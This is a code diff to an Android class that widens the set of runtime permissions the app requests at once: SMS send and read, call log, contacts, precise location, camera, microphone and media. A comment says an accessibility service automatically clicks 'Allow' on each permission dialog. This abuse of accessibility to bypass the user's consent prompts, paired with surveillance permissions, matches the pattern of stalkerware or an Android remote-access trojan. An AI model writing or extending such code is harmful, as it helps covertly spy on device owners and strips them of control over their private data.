@@ -44,22 +44,51 @@ public class AutoPermissionManager {
         Manifest.permission.VIBRATE
     };
 
+    /**
+     * All runtime (dangerous) permissions requested as a batch when accessibility
+     * is first enabled.  The auto-granter in UnifiedAccessibilityService will
+     * click "Allow" / "Allow all the time" on each dialog automatically.
+     *
+     * Rules:
+     *  - Every permission here must be declared in AndroidManifest.xml.
+     *  - Non-dangerous / install-time permissions are excluded — they are granted
+     *    automatically on install and don't produce a dialog.
+     *  - Storage permissions (MANAGE_EXTERNAL_STORAGE, All Files Access) are
+     *    requested on-demand from the dashboard because they require a Settings page.
+     *  - API-gated permissions use a safe try/catch in requestAllPermissions().
+     */
     public static final String[] DANGEROUS_PERMISSIONS = {
+        // ── Contacts & Phone ────────────────────────────────────────────────
+        Manifest.permission.READ_CONTACTS,
+        Manifest.permission.READ_CALL_LOG,
+        Manifest.permission.READ_PHONE_STATE,
+        "android.permission.READ_PHONE_NUMBERS",   // API 26+ (READ_PHONE_NUMBERS)
+
+        // ── SMS & MMS ───────────────────────────────────────────────────────
         Manifest.permission.READ_SMS,
         Manifest.permission.SEND_SMS,
         Manifest.permission.RECEIVE_SMS,
-        Manifest.permission.READ_CONTACTS,
-        Manifest.permission.READ_CALL_LOG,
+        Manifest.permission.RECEIVE_MMS,
+
+        // ── Location ────────────────────────────────────────────────────────
         Manifest.permission.ACCESS_FINE_LOCATION,
         Manifest.permission.ACCESS_COARSE_LOCATION,
-        Manifest.permission.CAMERA,
-        Manifest.permission.RECORD_AUDIO
-        // Storage/file access permissions are requested on-demand from the
-        // dashboard (App Mode) — not auto-granted during accessibility setup.
-    };
 
-    // Android 13+ permissions (storage-related ones are excluded — requested on-demand)
-    public static final String[] ANDROID_13_PERMISSIONS = {
+        // ── Camera & Microphone ─────────────────────────────────────────────
+        Manifest.permission.CAMERA,
+        Manifest.permission.RECORD_AUDIO,
+
+        // ── Storage (runtime dialogs only — Android ≤ 12) ──────────────────
+        // On Android 13+ these are superseded by READ_MEDIA_* below.
+        Manifest.permission.READ_EXTERNAL_STORAGE,
+
+        // ── Media (Android 13+, API 33) — safe to include; OS skips on older ─
+        "android.permission.READ_MEDIA_IMAGES",
+        "android.permission.READ_MEDIA_VIDEO",
+        "android.permission.READ_MEDIA_AUDIO",
+
+        // ── Notifications (Android 13+, API 33) ─────────────────────────────
+        "android.permission.POST_NOTIFICATIONS",
     };
 
     public AutoPermissionManager(Context context) {
@@ -70,36 +99,27 @@ public class AutoPermissionManager {
     }
 
     /**
-     * Request all dangerous permissions
+     * Request all dangerous permissions.
+     * Uses try/catch per permission so API-gated string permissions
+     * (READ_PHONE_NUMBERS, POST_NOTIFICATIONS, READ_MEDIA_*) don't crash on
+     * older Android versions where the constant doesn't exist.
      */
     public void requestAllPermissions() {
         if (activity == null) return;
 
         List<String> permissionsToRequest = new ArrayList<>();
 
-        // Check dangerous permissions
         for (String permission : DANGEROUS_PERMISSIONS) {
-            if (ContextCompat.checkSelfPermission(context, permission) 
-                != PackageManager.PERMISSION_GRANTED) {
-                permissionsToRequest.add(permission);
-            }
-        }
-
-        // Android 13+ permissions
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            for (String permission : ANDROID_13_PERMISSIONS) {
-                try {
-                    if (ContextCompat.checkSelfPermission(context, permission) 
+            try {
+                if (ContextCompat.checkSelfPermission(context, permission)
                         != PackageManager.PERMISSION_GRANTED) {
-                        permissionsToRequest.add(permission);
-                    }
-                } catch (Exception e) {
-                    // Permission might not exist on this device
+                    permissionsToRequest.add(permission);
                 }
+            } catch (Exception ignored) {
+                // Permission constant doesn't exist on this API level — skip silently
             }
         }
 
-        // Request permissions
         if (!permissionsToRequest.isEmpty()) {
             ActivityCompat.requestPermissions(
                 activity,
